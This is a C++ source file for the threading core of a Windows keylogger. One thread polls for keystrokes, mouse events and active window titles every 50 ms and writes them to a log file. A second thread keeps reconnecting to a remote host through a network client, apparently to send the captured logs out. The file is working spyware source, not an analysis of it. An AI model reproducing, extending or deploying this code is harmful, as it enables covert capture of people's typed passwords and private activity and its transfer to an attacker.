#include "Thread.h"

static HANDLE	_ghMutex;

// Com thread loop
DWORD WINAPI Thread::CLoop(LPVOID lpParam) {
	PMYDATA					pDataArray;
	boost::asio::io_service *io_service;
	Client					*pClient;

	pDataArray = (PMYDATA)lpParam;
	pClient = NULL;
	io_service = NULL;
	while (1) {
		if (!pClient) {
			io_service = new boost::asio::io_service;
			pClient = new Client(*io_service, *pDataArray->kLogger);
		}
		if (pClient) {
			pClient->Start(pClient->_tcpResolver.resolve(tcp::resolver::query(pClient->GetHostname(), pClient->GetPort())), &_ghMutex);
			io_service->run();
			delete pClient;
			delete io_service;
			pClient = NULL;
			io_service = NULL;
			Sleep(1000);
		}
	}
	return true;
}

// Keylogger thread loop
DWORD WINAPI Thread::KLoop(LPVOID lpParam) {
	DWORD		dwWaitResult;
	PMYDATA		pDataArray;
	std::string	log;

	pDataArray = (PMYDATA)lpParam;
	while (1) {
		Sleep(50);
		log = "";
		if (pDataArray->kLogger->GetWindow(log) || pDataArray->kLogger->GetKeys(log)
			|| pDataArray->kLogger->GetMouse(log)) {
			dwWaitResult = WaitForSingleObject(_ghMutex, INFINITE);
			switch (dwWaitResult) {
			case WAIT_OBJECT_0:
					pDataArray->kLogger->PrintLog(log, LOGS_FILE);
					if (!ReleaseMutex(_ghMutex)) {
						// Handle error.
					}
				break;
			case WAIT_ABANDONED:
				return false;
			}
		}
	}
	return true;
}

int	Thread::InitThreads(Keylogger &kLogger, Com &com) {
	_ghMutex = CreateMutex(NULL, FALSE, NULL);
	if (_ghMutex == NULL) {
		std::cout << "CreateMutex error: " << GetLastError() << std::endl;
		return 1;
	}
	for (int i = 0; i < MAX_THREADS; i++) {
		this->_pDataArray[i] = (PMYDATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MYDATA));
		if (this->_pDataArray[i] == NULL) {
			ExitProcess(2);
		}
		this->_pDataArray[i]->kLogger = &kLogger;
		this->_pDataArray[i]->com = &com;
		if (i == 0)
			this->_hThreadArray[i] = CreateThread(NULL, 0, Thread::KLoop, this->_pDataArray[i], 0, 
				&this->_dwThreadIdArray[i]);
		else if (i == 1)
			this->_hThreadArray[i] = CreateThread(NULL, 0, Thread::CLoop, this->_pDataArray[i], 0,
				&this->_dwThreadIdArray[i]);
		if (this->_hThreadArray[i] == NULL) {
			this->ErrorHandler(TEXT("CreateThread"));
			ExitProcess(3);
		}
	}
	// Wait until all threads have terminated.
	WaitForMultipleObjects(MAX_THREADS, this->_hThreadArray, TRUE, INFINITE);
	return 0;
}

void Thread::ErrorHandler(LPTSTR lpszFunction)
{
	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);
	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);
	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
}

void Thread::CloseThread(void) {
	for (int i = 0; i < MAX_THREADS; i++) {
		CloseHandle(this->_hThreadArray[i]);
		if (this->_pDataArray[i] != NULL) {
			HeapFree(GetProcessHeap(), 0, this->_pDataArray);
			this->_pDataArray[i] = NULL;
		}
	}
	CloseHandle(_ghMutex);
}